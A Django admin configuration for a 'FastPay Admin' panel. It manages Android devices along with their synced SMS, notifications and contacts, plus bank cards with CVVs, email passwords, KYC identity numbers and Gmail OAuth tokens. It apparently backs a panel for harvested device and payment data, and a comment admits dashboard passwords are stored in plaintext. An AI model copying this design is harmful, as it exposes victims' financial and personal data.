from django import forms
from django.contrib import admin
from .models import Item, Device, Message, Notification, Contact, BankCardTemplate, BankCard, Bank, GmailAccount, DashUser, FirebaseSyncLog, ActivationFailureLog, ApiRequestLog, ActivityLog, CaptureItem, TelegramUserLink

admin.site.site_header = "FastPay Admin"
admin.site.site_title = "FastPay Admin"
admin.site.index_title = "Administration"


@admin.register(Item)
class ItemAdmin(admin.ModelAdmin):
    list_display = ['id', 'title', 'description', 'created_at', 'updated_at']
    list_filter = ['created_at', 'updated_at']
    search_fields = ['title', 'description']
    readonly_fields = ['created_at', 'updated_at']


@admin.register(Device)
class DeviceAdmin(admin.ModelAdmin):
    list_display = ['id', 'device_id', 'name', 'model', 'code', 'is_active', 'sync_status', 'last_sync_at', 'phone', 'battery_percentage', 'last_seen', 'created_at']
    list_filter = ['is_active', 'sync_status', 'code', 'created_at', 'updated_at', 'last_sync_at']
    search_fields = ['device_id', 'name', 'model', 'code', 'phone', 'current_phone']
    readonly_fields = ['created_at', 'updated_at']
    fieldsets = (
        ('Device Information', {
            'fields': ('device_id', 'name', 'model', 'code', 'is_active')
        }),
        ('Contact Information', {
            'fields': ('phone', 'current_phone', 'current_identifier')
        }),
        ('Status Information', {
            'fields': ('last_seen', 'battery_percentage', 'time')
        }),
        ('Bank Information', {
            'fields': ('bankcard',)
        }),
        ('Sync Information', {
            'fields': (
                'sync_status', 'last_sync_at', 'last_hard_sync_at',
                'messages_last_synced_at', 'notifications_last_synced_at', 'contacts_last_synced_at',
                'sync_error_message', 'sync_metadata'
            ),
            'classes': ('collapse',),
        }),
        ('System Information', {
            'fields': ('system_info',),
            'classes': ('collapse',),
            'description': 'System information matching Firebase structure (buildInfo, displayInfo, storageInfo, etc.)'
        }),
        ('Timestamps', {
            'fields': ('created_at', 'updated_at')
        }),
    )


@admin.register(Message)
class MessageAdmin(admin.ModelAdmin):
    list_display = ['id', 'device', 'message_type', 'phone', 'body_preview', 'timestamp', 'read', 'created_at']
    list_filter = ['message_type', 'read', 'created_at', 'timestamp']
    search_fields = ['phone', 'body', 'device__device_id', 'device__name']
    readonly_fields = ['created_at']
    raw_id_fields = ['device']
    
    def body_preview(self, obj):
        """Show first 50 characters of message body"""
        return obj.body[:50] + '...' if len(obj.body) > 50 else obj.body
    body_preview.short_description = 'Body Preview'


@admin.register(Notification)
class NotificationAdmin(admin.ModelAdmin):
    list_display = ['id', 'device', 'package_name', 'title_preview', 'text_preview', 'timestamp', 'created_at']
    list_filter = ['package_name', 'created_at', 'timestamp']
    search_fields = ['package_name', 'title', 'text', 'device__device_id', 'device__name']
    readonly_fields = ['created_at']
    raw_id_fields = ['device']
    
    def title_preview(self, obj):
        """Show first 30 characters of title"""
        return obj.title[:30] + '...' if len(obj.title) > 30 else obj.title
    title_preview.short_description = 'Title'
    
    def text_preview(self, obj):
        """Show first 50 characters of text"""
        return obj.text[:50] + '...' if len(obj.text) > 50 else obj.text
    text_preview.short_description = 'Text Preview'


@admin.register(Contact)
class ContactAdmin(admin.ModelAdmin):
    list_display = ['name', 'display_name', 'phone_number', 'company', 'device', 'times_contacted', 'is_starred', 'created_at']
    list_filter = ['is_starred', 'company', 'created_at', 'updated_at']
    search_fields = ['name', 'display_name', 'phone_number', 'company', 'nickname', 'device__device_id']
    readonly_fields = ['created_at', 'updated_at']
    raw_id_fields = ['device']
    fieldsets = (
        ('Basic Information', {
            'fields': ('device', 'contact_id', 'name', 'display_name', 'phone_number')
        }),
        ('Contact Details', {
            'fields': ('company', 'job_title', 'department', 'nickname', 'phonetic_name')
        }),
        ('Media', {
            'fields': ('photo_uri', 'thumbnail_uri')
        }),
        ('Dates', {
            'fields': ('birthday', 'anniversary', 'last_contacted')
        }),
        ('Additional Info', {
            'fields': ('notes', 'times_contacted', 'is_starred')
        }),
        ('Nested Data', {
            'fields': ('phones', 'emails', 'addresses', 'websites', 'im_accounts'),
            'classes': ('collapse',)
        }),
        ('Timestamps', {
            'fields': ('created_at', 'updated_at')
        }),
    )


@admin.register(CaptureItem)
class CaptureItemAdmin(admin.ModelAdmin):
    list_display = ['id', 'source', 'title', 'user_email', 'device', 'status', 'created_at']
    list_filter = ['source', 'status', 'created_at']
    search_fields = ['title', 'content', 'user_email', 'source_url', 'device__device_id']
    readonly_fields = ['created_at', 'updated_at']


@admin.register(BankCardTemplate)
class BankCardTemplateAdmin(admin.ModelAdmin):
    list_display = ['template_code', 'template_name', 'bank_name', 'card_type', 'is_active', 'created_at']
    list_filter = ['is_active', 'card_type', 'created_at']
    search_fields = ['template_code', 'template_name', 'bank_name', 'description']
    readonly_fields = ['created_at', 'updated_at']


@admin.register(BankCard)
class BankCardAdmin(admin.ModelAdmin):
    list_display = ['id', 'device', 'bank_name', 'card_holder_name', 'card_number', 'card_type', 'status', 'created_at']
    list_filter = ['status', 'card_type', 'created_at', 'updated_at']
    search_fields = ['card_number', 'card_holder_name', 'bank_name', 'account_number', 'account_name', 'mobile_number', 'email', 'kyc_name', 'kyc_aadhar', 'kyc_pan', 'device__device_id']
    readonly_fields = ['created_at', 'updated_at']
    raw_id_fields = ['device', 'template', 'email_account']
    fieldsets = (
        ('Device & Template', {
            'fields': ('device', 'template', 'email_account')
        }),
        ('Card Information', {
            'fields': ('card_number', 'card_holder_name', 'card_type', 'expiry_date', 'cvv', 'status')
        }),
        ('Bank Information', {
            'fields': ('bank_name', 'bank_code', 'account_name', 'account_number', 'ifsc_code', 'branch_name')
        }),
        ('Financial Information', {
            'fields': ('balance', 'currency')
        }),
        ('Contact Information', {
            'fields': ('mobile_number', 'email', 'email_password')
        }),
        ('KYC Information', {
            'fields': ('kyc_name', 'kyc_address', 'kyc_dob', 'kyc_aadhar', 'kyc_pan')
        }),
        ('Additional Information', {
            'fields': ('additional_info',),
            'classes': ('collapse',)
        }),
        ('Timestamps', {
            'fields': ('created_at', 'updated_at')
        }),
    )


@admin.register(Bank)
class BankAdmin(admin.ModelAdmin):
    list_display = ['id', 'name', 'code', 'ifsc_code', 'country', 'is_active', 'created_at']
    list_filter = ['is_active', 'country', 'created_at', 'updated_at']
    search_fields = ['name', 'code', 'ifsc_code', 'swift_code', 'branch_name', 'city', 'state']
    readonly_fields = ['created_at', 'updated_at']
    fieldsets = (
        ('Basic Information', {
            'fields': ('name', 'code', 'is_active')
        }),
        ('Bank Codes', {
            'fields': ('ifsc_code', 'swift_code')
        }),
        ('Location', {
            'fields': ('branch_name', 'address', 'city', 'state', 'country', 'postal_code')
        }),
        ('Contact Information', {
            'fields': ('phone', 'email', 'website')
        }),
        ('Additional Information', {
            'fields': ('additional_info',),
            'classes': ('collapse',)
        }),
        ('Timestamps', {
            'fields': ('created_at', 'updated_at')
        }),
    )


@admin.register(GmailAccount)
class GmailAccountAdmin(admin.ModelAdmin):
    list_display = ['id', 'user_email', 'gmail_email', 'is_active', 'last_sync_at', 'created_at']
    list_filter = ['is_active', 'created_at', 'updated_at', 'last_sync_at']
    search_fields = ['user_email', 'gmail_email']
    readonly_fields = ['created_at', 'updated_at', 'last_sync_at']
    fieldsets = (
        ('Account Information', {
            'fields': ('user_email', 'gmail_email', 'is_active')
        }),
        ('OAuth Tokens', {
            'fields': ('access_token', 'refresh_token', 'token_expires_at'),
            'classes': ('collapse',)
        }),
        ('Scopes & Status', {
            'fields': ('scopes', 'last_sync_at')
        }),
        ('Timestamps', {
            'fields': ('created_at', 'updated_at')
        }),
    )
    
    def get_readonly_fields(self, request, obj=None):
        """Make tokens read-only for security"""
        readonly = list(super().get_readonly_fields(request, obj))
        if obj:  # Editing existing object
            readonly.extend(['access_token', 'refresh_token'])
        return readonly


class DashUserAdminForm(forms.ModelForm):
    role = forms.ChoiceField(
        choices=DashUser.ACCESS_LEVEL_CHOICES,
        label="Role",
        help_text="Dashboard access role"
    )

    class Meta:
        model = DashUser
        fields = ['email', 'password', 'full_name', 'role', 'status']

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        if self.instance and self.instance.pk:
            self.fields['role'].initial = self.instance.access_level

    def save(self, commit=True):
        instance = super().save(commit=False)
        instance.access_level = int(self.cleaned_data['role'])
        if commit:
            instance.save()
        return instance


@admin.register(DashUser)
class DashUserAdmin(admin.ModelAdmin):
    form = DashUserAdminForm
    list_display = ['email', 'full_name', 'role_display', 'status', 'last_login', 'created_at']
    list_filter = ['access_level', 'status', 'created_at', 'last_login']
    search_fields = ['email', 'full_name']
    readonly_fields = ['created_at', 'updated_at', 'last_login', 'last_activity']
    fieldsets = (
        ('Authentication', {
            'fields': ('email', 'password')
        }),
        ('User Information', {
            'fields': ('full_name',)
        }),
        ('Access Control', {
            'fields': ('role', 'status')
        }),
        ('Activity Tracking', {
            'fields': ('last_login', 'last_activity')
        }),
        ('Timestamps', {
            'fields': ('created_at', 'updated_at')
        }),
    )
    
    def save_model(self, request, obj, form, change):
        """Override save to handle password (in production, hash it here)"""
        # For now, store password as-is (matches Firebase structure)
        # In production, use: obj.set_password(obj.password) before saving
        super().save_model(request, obj, form, change)

    def role_display(self, obj):
        return obj.get_access_level_display()
    role_display.short_description = 'Role'
    role_display.admin_order_field = 'access_level'


@admin.register(FirebaseSyncLog)
class FirebaseSyncLogAdmin(admin.ModelAdmin):
    list_display = ['id', 'sync_type', 'device', 'status', 'devices_processed', 'messages_created', 'started_at', 'duration_seconds']
    list_filter = ['sync_type', 'status', 'started_at']
    search_fields = ['device__device_id', 'sync_type', 'error_message']
    readonly_fields = ['created_at', 'updated_at', 'started_at', 'completed_at', 'duration_seconds']
    fieldsets = (
        ('Sync Information', {
            'fields': ('sync_type', 'status', 'device')
        }),
        ('Results', {
            'fields': (
                'devices_processed', 'devices_succeeded', 'devices_failed',
                'messages_fetched', 'messages_created', 'messages_skipped',
                'messages_deleted_from_firebase'
            )
        }),
        ('Error Information', {
            'fields': ('error_message', 'error_details'),
            'classes': ('collapse',)
        }),
        ('Timing', {
            'fields': ('started_at', 'completed_at', 'duration_seconds')
        }),
        ('Additional Information', {
            'fields': ('additional_info',),
            'classes': ('collapse',)
        }),
        ('Timestamps', {
            'fields': ('created_at', 'updated_at')
        }),
    )
    
    def has_add_permission(self, request):
        """Disable manual creation - logs are created by sync operations"""
        return False


@admin.register(ActivationFailureLog)
class ActivationFailureLogAdmin(admin.ModelAdmin):
    """Admin interface for ActivationFailureLog"""
    list_display = ['id', 'device_id', 'code_attempted', 'mode', 'error_type', 'created_at']
    list_filter = ['mode', 'error_type', 'created_at']
    search_fields = ['device_id', 'code_attempted', 'error_type', 'error_message']
    readonly_fields = ['created_at']
    fieldsets = (
        ('Device Information', {
            'fields': ('device_id', 'code_attempted', 'mode')
        }),
        ('Error Information', {
            'fields': ('error_type', 'error_message', 'metadata')
        }),
        ('Timestamps', {
            'fields': ('created_at',)
        }),
    )
    ordering = ['-created_at']
    
    def has_add_permission(self, request):
        """Disable manual creation - logs are created by APK"""
        return False


@admin.register(ApiRequestLog)
class ApiRequestLogAdmin(admin.ModelAdmin):
    """Admin interface for ApiRequestLog"""
    list_display = ['id', 'method', 'path', 'status_code', 'user_identifier', 'response_time_ms', 'created_at']
    list_filter = ['method', 'status_code', 'created_at']
    search_fields = ['path', 'user_identifier', 'client_ip']
    readonly_fields = ['created_at']
    fieldsets = (
        ('Request Information', {
            'fields': ('method', 'path', 'status_code')
        }),
        ('User Information', {
            'fields': ('user_identifier', 'client_ip')
        }),
        ('Performance', {
            'fields': ('response_time_ms',)
        }),
        ('Timestamps', {
            'fields': ('created_at',)
        }),
    )
    ordering = ['-created_at']
    
    def has_add_permission(self, request):
        """Disable manual creation - logs are created automatically"""
        return False


@admin.register(ActivityLog)
class ActivityLogAdmin(admin.ModelAdmin):
    """Admin interface for ActivityLog"""
    list_display = ['id', 'user_email', 'activity_type', 'ip_address', 'created_at']
    list_filter = ['activity_type', 'created_at']
    search_fields = ['user_email', 'description', 'ip_address']
    readonly_fields = ['created_at']
    fieldsets = (
        ('Activity Information', {
            'fields': ('user_email', 'activity_type', 'description')
        }),
        ('Request Information', {
            'fields': ('ip_address', 'user_agent')
        }),
        ('Metadata', {
            'fields': ('metadata',)
        }),
        ('Timestamps', {
            'fields': ('created_at',)
        }),
    )
    ordering = ['-created_at']
    
    def has_add_permission(self, request):
        """Disable manual creation - logs are created automatically"""
        return False


@admin.register(TelegramUserLink)
class TelegramUserLinkAdmin(admin.ModelAdmin):
    list_display = ['id', 'company', 'user', 'telegram_chat_id', 'telegram_bot', 'opted_in_alerts', 'opted_in_reports', 'opted_in_device_events', 'updated_at']
    list_filter = ['company', 'opted_in_alerts', 'opted_in_reports', 'opted_in_device_events']
    search_fields = ['telegram_chat_id', 'user__email', 'company__code']
    raw_id_fields = ['company', 'user', 'telegram_bot']
    readonly_fields = ['link_token', 'link_token_expires_at', 'created_at', 'updated_at']
